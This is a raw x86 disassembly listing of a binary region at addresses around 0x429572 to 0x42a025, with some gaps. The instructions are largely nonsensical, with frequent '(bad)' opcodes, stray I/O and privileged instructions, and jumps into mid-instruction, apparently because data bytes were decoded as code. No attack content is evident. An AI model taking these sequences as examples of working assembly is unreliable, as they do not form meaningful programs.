  429572:	xchg   ebx,eax
  429573:	lods   eax,DWORD PTR ds:[esi]
  429574:	cwde   
  429575:	add    bl,al
  429577:	shl    DWORD PTR [ebx],cl
  429579:	sub    ch,bh
  42957b:	inc    edi
  42957c:	and    BYTE PTR ds:0xb486c0f5,cl
  429582:	dec    ebx
  429583:	fwait
  429584:	cmp    DWORD PTR [ebx+esi*4],ebp
  429587:	pop    ds
  429588:	daa    
  429589:	sar    DWORD PTR fs:[esi+ebx*4-0x6aefbe81],0xa4
  429592:	add    esp,DWORD PTR [ebx]
  429594:	daa    
  429595:	push   cs
  429596:	fwait
  429597:	mov    al,ds:0xf56a99e4
  42959c:	mov    esi,0x1440e1e
  4295a1:	aam    0x44
  4295a3:	adc    al,0xf9
  4295a5:	jnp    0x429573
  4295a7:	push   ebp
  4295a8:	repz loope 0x42957b
  4295ab:	test   ebp,eax
  4295ad:	or     al,BYTE PTR [ebx+ebp*1-0x40]
  4295b1:	mov    edx,0x94c6de39
  4295b6:	daa    
  4295b7:	sub    al,0x90
  4295b9:	loopne 0x4295dd
  4295bb:	jo     0x42959c
  4295bd:	mov    edx,edi
  4295bf:	cwde   
  4295c0:	mov    eax,DWORD PTR [ecx+edi*2-0x32]
  4295c4:	add    BYTE PTR [ecx+0x30],dl
  4295c7:	test   DWORD PTR [ecx+0x266dd16d],ebx
  4295cd:	or     BYTE PTR [eax],cl
  4295cf:	fstp   DWORD PTR [edx-0x152571b2]
  4295d5:	sar    DWORD PTR [esi+0xbd4ea2b],cl
  4295db:	dec    BYTE PTR [eax+edx*4-0x19c476bc]
  4295e2:	(bad)  
  4295e3:	repnz and esp,DWORD PTR [eax]
  4295e6:	sub    DWORD PTR [edi-0x40795380],eax
  4295ec:	inc    ecx
  4295ed:	loop   0x429665
  4295ef:	cwde   
  4295f0:	std    
  4295f1:	jnp    0x42957f
  4295f3:	aam    0x81
  4295f5:	data16 stos BYTE PTR es:[edi],al
  4295f7:	ror    BYTE PTR [edx+0x15],cl
  4295fa:	into   
  4295fb:	xor    ebp,DWORD PTR [ebx+0x13]
  4295fe:	jg     0x429672
  429600:	pop    edi
  429601:	or     ecx,esp
  429603:	(bad)  [edx-0x3a]
  429606:	les    esi,FWORD PTR [eax+0x64d1b43b]
  42960c:	jge    0x429685
  42960e:	sar    DWORD PTR ds:0xd33dd898,1
  429614:	dec    edi
  429615:	adc    dl,0x74
  429618:	arpl   WORD PTR [ebp+0x8],ax
  42961b:	xor    esp,esp
  42961d:	arpl   WORD PTR [eax-0x2d],cx
  429620:	loope  0x42963f
  429622:	cli    
  429623:	mov    edx,0x2356cdfa
  429628:	clc    
  429629:	jle    0x429626
  42962b:	adc    eax,0xea67484c
  429630:	arpl   ax,ax
  429632:	(bad)  
  429633:	dec    ecx
  429634:	mov    bl,0xd4
  429636:	xchg   DWORD PTR [ecx-0x1fa1b4be],esi
  42963c:	cli    
  42963d:	jp     0x429610
  42963f:	dec    esp
  429640:	xchg   esp,eax
  429641:	test   BYTE PTR [ebx+0x18284cd4],0xa3
  429648:	xor    edx,DWORD PTR [edi+eax*4]
  42964b:	sbb    eax,0x62be3332
  429650:	imul   esp,DWORD PTR [ebx+0xcee6851],0x178fdbaa
  42965a:	sub    al,0x23
  42965c:	mov    eax,ds:0xd1f03e4b
  429661:	(bad)  
  429662:	dec    eax
  429663:	add    edx,edx
  429665:	pop    esi
  429666:	and    ah,al
  429668:	cwde   
  429669:	or     eax,0x9ed0fa18
	...
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	push   edi
  4296e3:	call   0x1:0xbc6798fe
  4296ea:	add    BYTE PTR [ecx],al
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	icebp  
  4296ef:	mov    esp,0xff8dbf06
  4296f4:	into   
  4296f5:	ja     0x4296cf
  4296f7:	call   0x25dcb9f6
  4296fc:	sub    dh,cl
  4296fe:	push   edx
  4296ff:	jno    0x42975c
  429701:	push   eax
  429702:	dec    ebp
  429703:	xor    eax,0x2adf0a97
  429708:	mov    bl,0xcd
  42970a:	xchg   edi,eax
  42970b:	add    edx,ecx
  42970d:	inc    ebx
  42970e:	xor    al,BYTE PTR [edi+0x9241858]
  429714:	fisubr DWORD PTR ds:[eax]
  429717:	lahf   
  429718:	jne    0x42977f
  42971a:	cli    
  42971b:	jge    0x4296a8
  42971d:	test   BYTE PTR cs:[ebp+0x5447b70f],bl
  429724:	mov    dl,0x52
  429726:	sbb    DWORD PTR [edx],edx
  429728:	inc    edx
  429729:	div    BYTE PTR [edx+0x30]
  42972c:	adc    DWORD PTR [ebp-0xac6453a],edx
  429732:	jl     0x42970e
  429734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429735:	ret    0xa3bf
  429738:	jb     0x429746
  42973a:	jp     0x4296f2
  42973c:	cmp    BYTE PTR [ebp+0x3],0x39
  429740:	stos   BYTE PTR es:[edi],al
  429741:	mov    esi,0x187be35d
  429746:	cld    
  429747:	rol    DWORD PTR [edi],cl
  429749:	aas    
  42974a:	adc    DWORD PTR [ebp+0x45c8af6a],ebp
  429750:	les    edi,FWORD PTR [edi+0x1f]
  429753:	inc    esp
  429754:	cmc    
  429755:	fs loope 0x429734
  429758:	sub    eax,0x1b7342ed
  42975d:	add    al,0xe1
  42975f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429760:	ss push edi
  429762:	test   BYTE PTR [ebp+eax*8+0x3d],dl
  429766:	mov    eax,ds:0x467f336a
  42976b:	xchg   ecx,eax
  42976c:	test   eax,0x79b59c66
  429771:	fcom   QWORD PTR [edx]
  429773:	in     eax,dx
  429774:	mov    esi,0x5c5a8981
  429779:	cmp    al,0x64
  42977b:	jecxz  0x429776
  42977d:	sub    dh,bh
  42977f:	hlt    
  429780:	adc    al,0x5b
  429782:	pop    esp
  429783:	mov    al,0x79
  429785:	jg     0x4297b0
  429787:	retf   
  429788:	iret   
  429789:	ds (bad) 
  42978b:	adc    BYTE PTR [edx],cl
  42978d:	push   esi
  42978e:	shl    dh,0xd3
  429791:	outs   dx,DWORD PTR ds:[esi]
  429792:	or     dl,ah
  429794:	retf   
  429795:	repnz pusha 
  429797:	iret   
  429798:	retf   
  429799:	cmp    esi,edx
  42979b:	adc    edi,ebx
  42979d:	arpl   WORD PTR [esi+0x58],si
  4297a0:	mov    ah,0x67
  4297a2:	data16 data16 jnp 0x42973d
  4297a6:	(bad)  
  4297a7:	cmp    eax,0xd0b88081
  4297ac:	sub    BYTE PTR [edi+0x1ff0206f],ah
  4297b2:	pop    es
  4297b3:	add    al,0x48
  4297b5:	dec    esp
  4297b6:	js     0x4297d8
  4297b8:	cmp    eax,0xfcc4efd5
  4297bd:	inc    ebp
  4297be:	mov    edx,0xdbb2b362
  4297c3:	cwde   
  4297c4:	inc    esp
  4297c5:	inc    ebx
  4297c6:	aas    
  4297c7:	sbb    eax,DWORD PTR [edx]
  4297c9:	mov    bl,0xe4
  4297cb:	pop    esp
  4297cc:	sub    eax,0x1f6ba5e7
  4297d1:	call   0x9a9f345d
  4297d6:	cmp    dh,BYTE PTR [eax-0x37]
  4297d9:	out    dx,eax
  4297da:	call   0x9175d2f9
  4297df:	cld    
  4297e0:	inc    ecx
  4297e1:	aam    0xb5
  4297e3:	mov    BYTE PTR [ebx-0x5a],cl
  4297e6:	pop    esi
  4297e7:	cmp    BYTE PTR [ebp+0x18],cl
  4297ea:	push   cs
  4297eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297ec:	je     0x429784
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	repnz aad 0x21
  429865:	mov    edi,0x1bd67
  42986a:	add    BYTE PTR [ecx],al
  42986c:	add    BYTE PTR [eax],al
  42986e:	ds and ch,bl
  429871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429872:	mov    esi,0x65326638
  429877:	inc    eax
  429878:	shl    cl,cl
  42987a:	mov    ch,0xd9
  42987c:	mov    ?,WORD PTR [edx+0x22]
  42987f:	pushf  
  429880:	mov    eax,ds:0x9f522ee3
  429885:	mov    ds:0x758dff91,eax
  42988a:	adc    BYTE PTR [esi],al
  42988c:	sub    eax,0x6a733b73
  429891:	mov    ds:0x74694ff5,eax
  429896:	loope  0x42990c
  429898:	push   cs
  429899:	lods   al,BYTE PTR ds:[esi]
  42989a:	jbe    0x4298df
  42989c:	dec    edx
  42989d:	mov    al,ds:0x87b9bc03
  4298a2:	jns    0x429868
  4298a4:	sub    ebp,edx
  4298a6:	mov    eax,0x1b6a6fc4
  4298ab:	ret    
  4298ac:	out    0x5a,eax
  4298ae:	rol    DWORD PTR [ecx-0x17362a95],1
  4298b4:	scas   al,BYTE PTR es:[edi]
  4298b5:	add    dh,BYTE PTR [eax-0x6]
  4298b8:	rcl    BYTE PTR [esi-0x3a3531e3],0x3f
  4298bf:	add    BYTE PTR [eax+eiz*8],cl
  4298c2:	mov    eax,0x5b11fe49
  4298c7:	scas   al,BYTE PTR es:[edi]
  4298c8:	mov    al,0xdf
  4298ca:	inc    esp
  4298cb:	std    
  4298cc:	call   0x4bd3e403
  4298d1:	sub    DWORD PTR [edi+0x7937b6ae],0x5aac7f04
  4298db:	cmp    eax,0x237f2392
  4298e0:	xor    ebp,DWORD PTR [edx+0x20a95094]
  4298e6:	rcl    BYTE PTR [ecx+0x625e808b],1
  4298ec:	out    0xcf,al
  4298ee:	push   esp
  4298ef:	cli    
  4298f0:	inc    ebx
  4298f1:	outs   dx,BYTE PTR ds:[esi]
  4298f2:	rcl    ch,1
  4298f4:	xchg   bl,bl
  4298f6:	ins    DWORD PTR es:[edi],dx
  4298f7:	push   ebp
  4298f8:	arpl   WORD PTR ds:0xc17d3e8c,dx
  4298fe:	push   ebx
  4298ff:	sbb    ch,BYTE PTR [edi-0x58d1d1a1]
  429905:	push   DWORD PTR [eax+0x4c]
  429908:	pop    ss
  429909:	js     0x4298b2
  42990b:	loope  0x4298db
  42990d:	(bad)  
  42990e:	aaa    
  42990f:	jmp    0xd15ac7f9
  429914:	fmul   DWORD PTR [eax]
  429916:	push   es
  429917:	(bad)  ds:0x458c2233
  42991d:	jp     0x4298e1
  42991f:	add    ebp,DWORD PTR [ebx]
  429921:	push   0x9116325c
  429926:	cli    
  429927:	xchg   ecx,eax
  429928:	inc    esi
  429929:	xchg   esi,eax
  42992a:	sub    al,0xa9
  42992c:	mov    WORD PTR [eax+0x5f],?
  42992f:	pop    esp
  429930:	addr16 inc edx
  429932:	inc    edi
  429933:	fsubr  st,st(5)
  429935:	adc    DWORD PTR [esi+0x38],ebx
  429938:	pushf  
  429939:	(bad)  
  42993a:	(bad)  
  42993c:	jl     0x4298db
  42993e:	call   0x96a2:0x528edeff
  429945:	push   ecx
  429946:	int    0x9e
  429948:	cdq    
  429949:	scas   eax,DWORD PTR es:[edi]
  42994a:	adc    eax,0xde88dca0
  42994f:	push   ds
  429950:	cmp    esp,esp
  429952:	push   esi
  429953:	sbb    DWORD PTR [ebx],ebp
  429955:	mov    ds:0x84df27ff,al
  42995a:	out    dx,eax
  42995b:	xlat   BYTE PTR ds:[ebx]
  42995c:	fnstcw WORD PTR [edx]
  42995e:	and    DWORD PTR [eax+ebx*4-0x75cc09a7],0x3a
  429966:	mov    al,BYTE PTR [eax-0xce67402]
  42996c:	pop    ds
  42996d:	das    
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	push   ecx
  4299e3:	sub    BYTE PTR [ebx],al
  4299e5:	loop   0x429a4e
  4299e7:	mov    esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	push   eax
  4299ef:	in     al,dx
  4299f0:	xchg   BYTE PTR [ebp+edi*1+0x17dd5db],bl
  4299f7:	test   BYTE PTR [edi-0x382690eb],ah
  4299fd:	push   cs
  4299fe:	or     bh,0x34
  429a01:	jp     0x4299b6
  429a03:	jae    0x4299b0
  429a05:	or     cl,cl
  429a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a08:	cld    
  429a09:	test   al,0x6b
  429a0b:	outs   dx,DWORD PTR cs:[esi]
  429a0d:	or     eax,0xd28b4b90
  429a12:	daa    
  429a13:	sub    DWORD PTR [eax+edx*8+0x528ecdc2],ebp
  429a1a:	das    
  429a1b:	jbe    0x429a05
  429a1d:	bound  ecx,QWORD PTR [ecx+0x6c]
  429a20:	ret    
  429a21:	pmulhuw mm5,QWORD PTR [eax]
  429a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a25:	jo     0x429a96
  429a27:	push   edi
  429a28:	jecxz  0x429a55
  429a2a:	pop    ebx
  429a2b:	inc    ebx
  429a2c:	stos   DWORD PTR es:[edi],eax
  429a2d:	sbb    dl,BYTE PTR [ecx+0x73]
  429a30:	stos   BYTE PTR es:[edi],al
  429a31:	dec    edx
  429a32:	cmp    BYTE PTR [edi],ah
  429a34:	outs   dx,BYTE PTR ds:[esi]
  429a35:	jae    0x429a20
  429a37:	stos   DWORD PTR es:[edi],eax
  429a38:	stos   BYTE PTR es:[edi],al
  429a39:	xchg   edi,eax
  429a3a:	jo     0x429a92
  429a3c:	into   
  429a3d:	dec    edi
  429a3e:	xor    BYTE PTR [esi-0x53fbcc75],dl
  429a44:	int3   
  429a45:	cwde   
  429a46:	mov    dh,0xc5
  429a48:	jne    0x4299cf
  429a4a:	push   ebp
  429a4b:	xchg   esp,eax
  429a4c:	or     ch,BYTE PTR [esi+eiz*4-0x32]
  429a50:	sub    eax,0xdf0599a0
  429a55:	outs   dx,DWORD PTR ds:[esi]
  429a56:	and    DWORD PTR ds:0xbf2f93ea,ebx
  429a5c:	jp     0x429ac8
  429a5e:	leave  
  429a5f:	fstp   QWORD PTR [edi-0x75cb66af]
  429a65:	xor    edx,0xaede88eb
  429a6b:	pop    esi
  429a6c:	imul   DWORD PTR [eax+0x401c03e2]
  429a72:	call   0x5783:0x98c7bc13
  429a79:	push   eax
  429a7a:	mov    ecx,0x72162d2b
  429a7f:	in     al,dx
  429a80:	test   al,0x24
  429a82:	and    eax,0xcc6c9ec8
  429a87:	push   es
  429a88:	jmp    0x8c88:0xadc5aae8
  429a8f:	nop
  429a90:	stos   BYTE PTR es:[edi],al
  429a91:	xor    ah,BYTE PTR [ebx+edi*2-0x59890148]
  429a98:	or     DWORD PTR [ebx],eax
  429a9a:	add    al,0x7
  429a9c:	pop    edx
  429a9d:	sbb    BYTE PTR ds:0x61c891c3,bl
  429aa3:	mov    ch,0xa7
  429aa5:	sub    ah,0x28
  429aa8:	(bad)  
  429aaa:	pop    ds
  429aab:	or     edi,DWORD PTR [eax+0x76cec9c1]
  429ab1:	pop    ds
  429ab2:	lea    ecx,[edx+0xda92065]
  429ab8:	xor    eax,0x2b02f842
  429abd:	mov    DWORD PTR [ecx+0x6cd1dcd6],ebp
  429ac3:	add    DWORD PTR [ecx-0x40],esp
  429ac6:	icebp  
  429ac7:	push   ss
  429ac8:	enter  0x8887,0x36
  429acc:	stos   BYTE PTR es:[edi],al
  429acd:	in     eax,dx
  429ace:	jbe    0x429afa
  429ad0:	les    esi,FWORD PTR [ecx-0x30d59e61]
  429ad6:	xor    al,0xba
  429ad8:	xlat   BYTE PTR ds:[ebx]
  429ad9:	mov    edx,0x23223382
  429ade:	mov    dl,BYTE PTR [ebx-0x55]
  429ae1:	cwde   
  429ae2:	fwait
  429ae3:	icebp  
  429ae4:	jnp    0x429b61
  429ae6:	cli    
  429ae7:	leave  
  429ae8:	push   eax
  429ae9:	mov    ds,ebx
  429aeb:	jns    0x429b63
  429aed:	add    BYTE PTR gs:[eax],al
	...
  429b54:	add    BYTE PTR [eax],al
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x4ba95667
  429b63:	lock jle 0x429bc9
  429b66:	addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	xor    eax,0x37555772
  429b73:	in     al,dx
  429b74:	rol    DWORD PTR [ecx+edx*8+0x13],0x4c
  429b79:	sub    bh,BYTE PTR [eax+eiz*8+0x7]
  429b7d:	xor    ebp,edi
  429b7f:	pop    ecx
  429b80:	std    
  429b81:	mov    WORD PTR [ebx+0x52],ds
  429b84:	js     0x429bae
  429b86:	lods   al,BYTE PTR ds:[esi]
  429b87:	ja     0x429b1c
  429b89:	or     BYTE PTR [ecx+eax*1-0x5c],ah
  429b8d:	mov    eax,ds:0x31878a14
  429b92:	dec    edi
  429b93:	ss xchg esi,eax
  429b95:	pop    edi
  429b96:	push   ss
  429b97:	pop    es
  429b98:	ins    BYTE PTR es:[edi],dx
  429b99:	cld    
  429b9a:	or     DWORD PTR [edi-0x4f1b1f0e],0xb93a6d26
  429ba4:	xchg   esp,eax
  429ba5:	sbb    bh,BYTE PTR [edi-0x3543b786]
  429bab:	add    dl,BYTE PTR [ebx+0x21]
  429bae:	in     al,0x1d
  429bb0:	mov    edx,0xbc613994
  429bb5:	loop   0x429b80
  429bb7:	sbb    al,dl
  429bb9:	mov    edi,0x1bff34c3
  429bbe:	inc    ebx
  429bbf:	push   esi
  429bc0:	in     al,dx
  429bc1:	(bad)  
  429bc2:	(bad)  
  429bc3:	xchg   esp,eax
  429bc4:	inc    eax
  429bc5:	inc    edi
  429bc6:	mov    ds:0x83352018,eax
  429bcb:	sbb    al,0x9d
  429bcd:	ds das 
  429bcf:	or     BYTE PTR [edx+0x6ff4f480],ch
  429bd5:	xchg   ebx,eax
  429bd6:	repnz mov ch,0xc1
  429bd9:	adc    al,0x21
  429bdb:	shr    DWORD PTR [edi+0x72],cl
  429bde:	and    DWORD PTR [ebx+ebp*2-0x3d883c2b],ecx
  429be5:	stos   DWORD PTR es:[edi],eax
  429be6:	in     ax,0xd5
  429be9:	data16 stc 
  429beb:	cmc    
  429bec:	repnz inc edi
  429bee:	(bad)  
  429bf0:	add    BYTE PTR es:[ecx+ebx*1+0x6],dh
  429bf5:	lods   eax,DWORD PTR ds:[esi]
  429bf6:	scas   al,BYTE PTR es:[edi]
  429bf7:	mov    al,ds:0xdd10c8a4
  429bfc:	sbb    eax,0x3d801e03
  429c01:	sbb    bh,BYTE PTR [eax+0x7c5cbc85]
  429c07:	lods   al,BYTE PTR ds:[esi]
  429c08:	sub    ebp,DWORD PTR [esi-0x3b]
  429c0b:	adc    esp,edi
  429c0d:	jmp    FWORD PTR [ecx+ebx*8]
  429c10:	icebp  
  429c11:	push   es
  429c12:	xchg   edx,eax
  429c13:	(bad)  
  429c14:	call   0x9ceb1990
  429c19:	lds    esp,FWORD PTR [ecx+eax*2+0x100c3cde]
  429c20:	xchg   ebp,eax
  429c21:	lahf   
  429c22:	mov    edi,0xb2108fc4
  429c27:	sbb    al,0x66
  429c29:	pushf  
  429c2a:	mov    edx,0xd6ad4a54
  429c2f:	test   al,0x91
  429c31:	pop    es
  429c32:	jo     0x429bfe
  429c34:	rcr    DWORD PTR [edi],1
  429c36:	mov    ecx,0x9f80fc2b
  429c3b:	push   0xac1cf972
  429c40:	xor    ebp,DWORD PTR [ebx+0x35]
  429c43:	imul   edx,DWORD PTR [eax],0x7c
  429c46:	cmp    ecx,DWORD PTR [esi+0x7211d1f]
  429c4c:	div    DWORD PTR [eax-0x411824ed]
  429c52:	cmp    al,0x44
  429c54:	cmp    esp,DWORD PTR [edx-0x7cc993f5]
  429c5a:	add    BYTE PTR [eax-0x740c7fcb],0xf2
  429c61:	and    cl,BYTE PTR [eax-0x77]
  429c64:	aaa    
  429c65:	popf   
  429c66:	push   edi
  429c67:	dec    edi
  429c68:	inc    edx
  429c69:	fsubp  st(7),st
  429c6b:	js     0x429c96
  429c6d:	and    BYTE PTR [eax],al
	...
  429cd3:	add    BYTE PTR [eax],al
  429cd5:	add    BYTE PTR [ebx-0x487759ea],ah
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    dl,bh
  429ce3:	hlt    
  429ce4:	adc    al,0x58
  429ce6:	rol    BYTE PTR [bx+di],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	push   es
  429cef:	pop    edx
  429cf0:	shl    dh,cl
  429cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cf3:	push   esp
  429cf4:	out    0x94,al
  429cf6:	(bad)
  429cf9:	xchg   edi,eax
  429cfa:	cld    
  429cfb:	fs xor al,0xbe
  429cfe:	xor    eax,0x8e91e68e
  429d03:	lea    esp,[edx+ebp*2+0x5167ee7]
  429d0a:	jp     0x429d26
  429d0c:	sti    
  429d0d:	jbe    0x429d42
  429d0f:	adc    cl,BYTE PTR [edi]
  429d11:	mov    edi,0x2ba03129
  429d16:	push   ss
  429d17:	mov    BYTE PTR [eax+esi*2],al
  429d1a:	xchg   ebx,eax
  429d1b:	push   cs
  429d1c:	jmp    0x2e85854b
  429d21:	jb     0x429d57
  429d23:	ins    BYTE PTR es:[edi],dx
  429d24:	pop    ds
  429d25:	lods   al,BYTE PTR ds:[esi]
  429d26:	push   0xffffffc2
  429d28:	repnz sbb al,0xb3
  429d2b:	(bad)  
  429d2c:	mov    esi,0x22700dd4
  429d31:	js     0x429d28
  429d33:	mov    eax,0x444526c3
  429d38:	into   
  429d39:	inc    edx
  429d3a:	mov    eax,ds:0x5b1c6d97
  429d3f:	fdivr  st,st(1)
  429d41:	shl    esi,0xe9
  429d44:	inc    DWORD PTR [bp-0x4d79]
  429d49:	jge    0x429d5e
  429d4b:	stc    
  429d4c:	inc    esp
  429d4d:	mov    ?,WORD PTR ds:0x99b2f764
  429d53:	push   0x31
  429d55:	addr16 mov ds:0xce05,al
  429d59:	and    al,al
  429d5b:	ucomiss xmm7,xmm6
  429d5e:	push   esi
  429d5f:	push   cs
  429d60:	add    DWORD PTR [esp+eax*4+0x30],eax
  429d64:	int    0x89
  429d66:	push   ds
  429d67:	fisttp QWORD PTR [ecx]
  429d69:	retf   
  429d6a:	xchg   DWORD PTR [ebx-0x3dd4fb71],eax
  429d70:	push   edx
  429d71:	sbb    al,0xd7
  429d73:	mov    al,0x23
  429d75:	mov    bl,0x1c
  429d77:	dec    ebp
  429d78:	fisttp DWORD PTR [ebp+0x39100035]
  429d7e:	fadd   DWORD PTR [ebp+0x46]
  429d81:	sbb    eax,0xef967819
  429d86:	inc    edi
  429d87:	jne    0x429d4f
  429d89:	scas   al,BYTE PTR es:[edi]
  429d8a:	xor    al,0xbe
  429d8c:	lods   al,BYTE PTR ds:[esi]
  429d8d:	adc    DWORD PTR [ebx],0x53d029cc
  429d93:	sub    bh,BYTE PTR [ebx-0x3324d5c7]
  429d99:	or     eax,0xaf256e41
  429d9e:	mov    esi,0xc69e3c93
  429da3:	dec    eax
  429da4:	pop    ss
  429da5:	in     eax,0x58
  429da7:	mov    bh,0x7a
  429da9:	das    
  429daa:	ret    
  429dab:	lods   eax,DWORD PTR ds:[esi]
  429dac:	mov    edx,0x4271d00a
  429db1:	adc    esi,ecx
  429db3:	std    
  429db4:	data16 mov WORD PTR [ecx+0x6e],ds
  429db8:	sbb    edi,DWORD PTR [eax]
  429dba:	ret    
  429dbb:	ror    BYTE PTR [ecx-0x86d35ba],cl
  429dc1:	repz inc ebp
  429dc3:	imul   eax,esi,0x3c
  429dc6:	stos   DWORD PTR es:[edi],eax
  429dc7:	hlt    
  429dc8:	das    
  429dc9:	mov    ds:0xd7e77882,al
  429dce:	push   edi
  429dcf:	mov    bh,0xc8
  429dd1:	pop    ebp
  429dd2:	pop    es
  429dd3:	cli    
  429dd4:	pop    edx
  429dd5:	inc    ebp
  429dd6:	out    dx,al
  429dd7:	enter  0x3148,0x95
  429ddb:	adc    bh,BYTE PTR [edi+0x3a]
  429dde:	sub    al,0xe3
  429de1:	scas   al,BYTE PTR es:[edi]
  429de2:	shl    esi,cl
  429de4:	fidiv  WORD PTR [ebx]
  429de6:	xor    DWORD PTR [esi],edi
  429de8:	daa    
  429de9:	ds cmc 
  429deb:	lea    ecx,[ecx+0x37]
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	dec    edx
  429e63:	popf   
  429e64:	and    eax,0x1c16772
  429e69:	add    BYTE PTR [eax],al
  429e6b:	add    DWORD PTR [eax],eax
  429e6d:	add    BYTE PTR [ebx+0x39],ah
  429e70:	sahf   
  429e71:	gs es sti 
  429e74:	ret    0x4b77
  429e77:	ficom  DWORD PTR [edi+0x6e]
  429e7a:	or     al,0x70
  429e7c:	test   al,0x6a
  429e7e:	mov    ds:0x87d782be,eax
  429e83:	(bad)  
  429e84:	add    BYTE PTR [ebx-0x2d],bl
  429e87:	arpl   WORD PTR [esp+esi*8-0x54d70e76],sp
  429e8e:	mov    fs,WORD PTR [edx+0x7dac1812]
  429e94:	mov    esi,0x79f845e1
  429e99:	movaps XMMWORD PTR [ecx+0x6d],xmm5
  429e9d:	xor    al,0xb5
  429e9f:	jle    0x429f16
  429ea1:	add    eax,0x93705204
  429ea6:	or     al,0xf5
  429ea8:	mov    ecx,0x434499ba
  429ead:	test   DWORD PTR [esp+edi*4],edx
  429eb0:	sub    ebp,DWORD PTR [ebp+0x1d4e45bd]
  429eb6:	sub    eax,0x63b50b7a
  429ebb:	cmp    eax,0x53df11b8
  429ec0:	mov    bh,cl
  429ec2:	xor    ch,BYTE PTR [esp+ecx*8]
  429ec5:	loope  0x429efb
  429ec7:	and    al,0x40
  429ec9:	xor    BYTE PTR [ebx+0x2e3fd804],0xc3
  429ed0:	shl    BYTE PTR [esi-0x53],cl
  429ed3:	stos   DWORD PTR es:[edi],eax
  429ed4:	cdq    
  429ed5:	scas   al,BYTE PTR es:[edi]
  429ed6:	xor    bl,BYTE PTR [ebx+0x7a]
  429ed9:	sar    BYTE PTR [ecx+0x676848a4],1
  429edf:	xor    al,0xe7
  429ee1:	mov    ch,0x81
  429ee3:	xor    BYTE PTR [ebp+0x3d333096],ah
  429ee9:	addr16 data16 das 
  429eec:	cdq    
  429eed:	out    0x1f,eax
  429eef:	pop    ecx
  429ef0:	shl    DWORD PTR [ecx+edi*8],1
  429ef3:	shl    DWORD PTR [edx],0x29
  429ef6:	fdivr  DWORD PTR ds:0x4f1ac5ad
  429efc:	xor    bl,BYTE PTR [ecx+0x36da21eb]
  429f02:	pop    ds
  429f03:	dec    eax
  429f04:	and    eax,0x45256ea5
  429f09:	aad    0x76
  429f0b:	dec    esi
  429f0c:	jae    0x429f5b
  429f0e:	inc    ebx
  429f0f:	push   esi
  429f10:	stc    
  429f11:	ss in  eax,0x35
  429f14:	inc    edi
  429f15:	push   0xffffffe5
  429f17:	dec    esp
  429f18:	mov    dh,0xe8
  429f1a:	push   0x362ed0c3
  429f1f:	mov    ah,0x3a
  429f21:	cwde   
  429f22:	aad    0x9a
  429f24:	out    dx,al
  429f25:	sti    
  429f26:	mov    dh,BYTE PTR [esi+0x7100a058]
  429f2c:	inc    esi
  429f2d:	jno    0x429eea
  429f2f:	xchg   esp,eax
  429f30:	mov    cl,0x84
  429f32:	pusha  
  429f33:	adc    eax,0x87980344
  429f38:	mov    dh,0x37
  429f3a:	xchg   ecx,eax
  429f3b:	xchg   BYTE PTR [edi],dh
  429f3d:	xchg   esp,eax
  429f3e:	mov    eax,0x1b5dd02f
  429f43:	dec    ebx
  429f44:	xor    dh,BYTE PTR [esi-0x42]
  429f47:	push   cs
  429f48:	shr    BYTE PTR [esi+0x4e],0xfd
  429f4c:	inc    eax
  429f4d:	and    eax,0xffffff9b
  429f50:	xchg   ecx,ebp
  429f52:	xor    ah,cl
  429f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f55:	(bad)  
  429f56:	and    esi,DWORD PTR [ebp-0x76]
  429f59:	mov    dh,dh
  429f5b:	arpl   WORD PTR [ebx-0x1b],cx
  429f5e:	out    0xac,al
  429f60:	fmul   st,st(4)
  429f62:	js     0x429f66
  429f64:	or     DWORD PTR cs:[edi],esp
  429f67:	push   0x30fb64bb
  429f6c:	jnp    0x429f7d
	...
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x4be95514]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	or     ah,BYTE PTR [eax-0x8]
  429ff1:	mov    al,0x8b
  429ff3:	out    0x8b,al
  429ff5:	popf   
  429ff6:	mov    eax,0x4452273
  429ffb:	test   DWORD PTR [esi],0xc38db93b
  42a001:	or     bh,cl
  42a003:	jne    0x42a05c
  42a005:	mov    dh,0x6c
  42a007:	aad    0xa0
  42a009:	sar    DWORD PTR [edi+ecx*2+0x7f71743e],1
  42a010:	mov    edx,0xf5bad413
  42a015:	rcl    DWORD PTR [esi],1
  42a017:	inc    ecx
  42a018:	cmp    DWORD PTR ds:0xb2108ed6,0xffffffd6
  42a01f:	xchg   ebp,eax
  42a020:	cmp    BYTE PTR [edx+edi*4],ch
  42a023:	hlt    
  42a024:	(bad)  
  42a025:	out    dx,eax
